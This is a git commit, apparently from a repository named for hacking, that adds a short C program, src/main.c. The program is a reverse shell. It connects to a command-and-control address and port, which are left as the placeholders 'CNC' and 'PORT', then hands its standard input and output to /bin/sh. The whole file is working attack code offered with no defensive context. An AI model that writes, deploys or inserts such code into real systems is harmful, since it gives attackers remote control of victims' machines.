bb9ae32d2ed23f13708f3c0971b0002e01ba57a8
mallrs <trypwnme.hack@gmail.com>
2025-11-23 13:18:37 +0900

    Create main.c

---
+++ src/main.c
@@ -0,0 +1,28 @@
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+#include <unistd.h>
+#include <errno.h>
+
+int main(int argc, char **argv)
+{
+        struct sockaddr_in serveraddr;
+        int server_sockfd;
+        int client_len;
+        char buf[80],rbuf[80], *cmdBuf[2]={"/bin/sh",(char *)0};
+
+        server_sockfd = socket(AF_INET, SOCK_STREAM, 6);
+        serveraddr.sin_family = AF_INET;
+        serveraddr.sin_addr.s_addr = inet_addr("CNC"); 
+        serveraddr.sin_port = htons(atoi("PORT"));
+        client_len = sizeof(serveraddr);
+
+        connect(server_sockfd, (struct sockaddr*)&serveraddr, client_len);
+
+        dup2(server_sockfd, 0);
+        dup2(server_sockfd, 1);
+        dup2(server_sockfd, 2);
+
+        execve("/bin/sh",cmdBuf,0);
+}
